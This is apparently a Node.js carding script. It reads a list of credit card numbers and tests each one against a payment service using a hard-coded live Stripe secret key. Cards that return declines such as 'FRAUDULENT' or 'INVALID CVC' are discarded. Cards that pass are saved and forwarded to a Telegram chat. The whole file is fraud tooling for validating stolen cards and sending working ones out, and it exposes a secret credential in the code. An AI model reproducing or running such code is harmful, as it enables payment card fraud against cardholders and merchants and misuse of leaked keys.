const fs = require("fs");
const cc = require('./cc');
const remove = require("./remove");
const save = require("./save");
const logs = require("./logs.js");
const {JSDOM} = require("jsdom");
const cards = fs.readFileSync("ccards","utf-8");
const tg = require("./tg");
const errs = ["TRY AGAIN LATER","GENERIC DECLINE","FRAUDULENT","INVALID CARD","INCORRECT NUMBER","DO NOT HONOR", "INVALID CVC" ];

function start(){

//let sk = fs.readFileSync("sk","utf-8").trim();
let sk = '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';
const process_cards = cards.split("\n");

for(var i = 0;i < process_cards.length;i++){
  (function(i) {
  	try{
    setTimeout(async() => {
      const res = await cc.mainccn(sk, process_cards[i],4,"usd");
      const dom = await new JSDOM(res);
      dom.window.document.querySelectorAll("span").forEach(s => {
      	if(s.textContent.includes("RESULT")){
      		if(!errs.includes(s.textContent.slice(8)) && s.textContent != 'RESULT:  ' ){
      			console.log(s.textContent,res);
      			
      		(async function (){
      			let data = "\n";
      		const resp = await cc.mainccn(sk, process_cards[i],4,"usd"); 
      		const doms = await new JSDOM(resp);
      		doms.window.document.querySelectorAll("span").forEach(d => {
      		  
      	data += d.textContent.replace(/^\n?\s*DEAD\s*$/gm, "DEAD") + "\n";
      	data = data.replace("DEAD\n","DEAD");
      	setTimeout(function() {
  tg.sendMessage(data)}, 3000);

      		 
      		})
      		
      		
      			
      					
      			save(data);
      			})() 
      			 			
      			} else {      				
      				remove(process_cards[i])
           logs(s.textContent + ': ' +process_cards[i] );

      				}
      		}
      	})
      //console.log(dom.window.document
    }, 1500 * i);
   } catch (err) {start()};
  })(i);
}
}

start() 
